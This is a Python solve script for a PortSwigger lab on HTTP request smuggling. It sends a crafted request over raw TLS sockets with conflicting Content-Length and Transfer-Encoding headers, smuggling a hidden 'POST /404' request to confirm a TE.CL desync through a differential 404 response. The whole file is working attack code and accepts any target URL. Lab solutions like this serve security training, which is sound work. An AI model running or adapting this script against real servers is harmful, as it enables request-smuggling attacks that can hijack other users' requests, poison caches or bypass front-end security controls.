#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Confirming a TE.CL vulnerability via
differential responses.

Front-end TE, back-end CL. Smuggle a complete POST /404 inside a chunk of
exactly 0x5e (94) bytes. Back-end's CL=4 makes it park the chunk contents
in its socket buffer; the next request on the connection gets routed to
/404 and returns a differential 404.

Raw TLS sockets because `requests` normalizes conflicting length headers.
"""

import argparse
import socket
import ssl
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5e\r\n"
    "POST /404 HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)


def send_sequence(host: str, port: int, body: bytes, count: int = 2) -> list[bytes]:
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for _ in range(count):
                ssock.sendall(body)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\r\n\r\n" in data and len(data) > 100:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 5 (TE.CL differential response)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    smuggled_chunk = (
        "POST /404 HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    assert len(smuggled_chunk.encode()) == 0x5e, (
        f"Smuggled chunk must be 0x5e (94) bytes; got {len(smuggled_chunk.encode())}"
    )

    body = SMUGGLE_TEMPLATE.format(host=host).encode()
    print(f"[*] Sending TE.CL differential-response probe twice to {host}:{port}")
    responses = send_sequence(host, port, body)

    for i, r in enumerate(responses, 1):
        status = r.split(b"\r\n", 1)[0].decode(errors="replace") if r else "<empty>"
        print(f"\n[+] Response {i} status: {status}")

    if b" 404 " in responses[-1][:20]:
        print("\n[+] Differential 404 observed on second response — smuggling confirmed.")
    else:
        print("\n[-] Second response wasn't 404.")


if __name__ == "__main__":
    main()
